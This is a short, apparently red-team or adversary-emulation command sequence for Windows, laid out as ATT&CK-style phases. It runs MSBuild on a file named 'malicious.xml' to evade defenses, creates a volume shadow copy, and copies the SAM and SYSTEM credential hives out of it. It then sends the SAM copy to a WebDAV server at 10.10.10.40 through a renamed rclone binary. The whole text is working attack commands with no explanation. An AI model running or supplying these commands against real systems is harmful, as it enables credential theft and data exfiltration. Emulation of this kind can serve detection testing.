# Phase 1: Defense Evasion (MSBuild)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Temp\malicious.xml

# Phase 2: Credential Access (Volume Shadow Copy via CIM)
powershell.exe -Command "Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\'}"

# Phase 2: Registry Hive Extraction
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam.save
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system.save

# Phase 3: Data Exfiltration (Renamed Rclone)
cd C:\Temp\rclone-v1.75.1-windows-amd64
backup_service.exe copy C:\Temp\sam.save :webdav:exfil --webdav-url http://10.10.10.40:8080 --webdav-vendor other
